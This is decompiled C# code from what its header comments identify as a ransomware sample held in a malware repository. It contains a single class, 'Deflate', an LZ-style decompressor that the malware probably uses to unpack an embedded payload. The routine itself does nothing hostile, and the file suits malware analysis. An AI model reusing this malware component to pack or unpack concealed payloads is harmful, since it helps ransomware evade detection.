// Decompiled with JetBrains decompiler
// Type: Deflate
// Assembly: BetaC, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FAE9A6C4-2FF5-4AD9-9EF1-0165332DD30F
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Foreign.nfqw-c98e20865bcc0a61937111b3af6eef1d386d4fe6ee47953261e865dbea2d166c.exe

using System;

public class Deflate
{
  private const int HASH_VALUES = 4096;
  private const int UNCONDITIONAL_MATCHLEN = 6;
  private const int UNCOMPRESSED_END = 4;
  private const int CWORD_LEN = 4;

  private static int headerLen(byte[] source) => ((int) source[0] & 2) != 2 ? 3 : 9;

  public static int sizeDecompressed(byte[] source) => Deflate.headerLen(source) == 9 ? (int) source[5] | (int) source[6] << 8 | (int) source[7] << 16 | (int) source[8] << 24 : (int) source[2];

  public static byte[] Decompress(byte[] source)
  {
    int length = Deflate.sizeDecompressed(source);
    int index1 = Deflate.headerLen(source);
    int index2 = 0;
    uint num1 = 1;
    byte[] numArray = new byte[length];
    int num2 = length - 6 - 4 - 1;
    uint num3 = 0;
    int num4 = (int) source[0] >> 2 & 3;
    if (((int) source[0] & 1) != 1)
    {
      byte[] destinationArray = new byte[length];
      Array.Copy((Array) source, Deflate.headerLen(source), (Array) destinationArray, 0, length);
      return destinationArray;
    }
    while (true)
    {
      if (num1 == 1U)
      {
        num1 = (uint) ((int) source[index1] | (int) source[index1 + 1] << 8 | (int) source[index1 + 2] << 16 | (int) source[index1 + 3] << 24);
        index1 += 4;
        if (index2 <= num2)
          num3 = num4 != 1 ? (uint) ((int) source[index1] | (int) source[index1 + 1] << 8 | (int) source[index1 + 2] << 16 | (int) source[index1 + 3] << 24) : (uint) ((int) source[index1] | (int) source[index1 + 1] << 8 | (int) source[index1 + 2] << 16);
      }
      if (((int) num1 & 1) == 1)
      {
        num1 >>= 1;
        uint num5;
        uint num6;
        if (((int) num3 & 3) == 0)
        {
          num5 = (num3 & (uint) byte.MaxValue) >> 2;
          num6 = 3U;
          ++index1;
        }
        else if (((int) num3 & 2) == 0)
        {
          num5 = (num3 & (uint) ushort.MaxValue) >> 2;
          num6 = 3U;
          index1 += 2;
        }
        else if (((int) num3 & 1) == 0)
        {
          num5 = (num3 & (uint) ushort.MaxValue) >> 6;
          num6 = (uint) (((int) (num3 >> 2) & 15) + 3);
          index1 += 2;
        }
        else if (((int) num3 & (int) sbyte.MaxValue) != 3)
        {
          num5 = num3 >> 7 & 131071U;
          num6 = (uint) (((int) (num3 >> 2) & 31) + 2);
          index1 += 3;
        }
        else
        {
          num5 = num3 >> 15;
          num6 = (uint) (((int) (num3 >> 7) & (int) byte.MaxValue) + 3);
          index1 += 4;
        }
        uint index3 = (uint) ((ulong) index2 - (ulong) num5);
        numArray[index2] = numArray[(IntPtr) index3];
        numArray[index2 + 1] = numArray[(IntPtr) (index3 + 1U)];
        numArray[index2 + 2] = numArray[(IntPtr) (index3 + 2U)];
        for (int index4 = 3; (long) index4 < (long) num6; ++index4)
          numArray[index2 + index4] = numArray[(long) index3 + (long) index4];
        index2 += (int) num6;
        num3 = (uint) ((int) source[index1] | (int) source[index1 + 1] << 8 | (int) source[index1 + 2] << 16 | (int) source[index1 + 3] << 24);
      }
      else if (index2 <= num2)
      {
        numArray[index2] = source[index1];
        ++index2;
        ++index1;
        num1 >>= 1;
        num3 = (uint) ((int) (num3 >> 8) & (int) ushort.MaxValue | (int) source[index1 + 2] << 16 | (int) source[index1 + 3] << 24);
      }
      else
        break;
    }
    while (index2 <= length - 1)
    {
      if (num1 == 1U)
      {
        index1 += 4;
        num1 = 2147483648U;
      }
      numArray[index2] = source[index1];
      ++index2;
      ++index1;
      num1 >>= 1;
    }
    return numArray;
  }
}
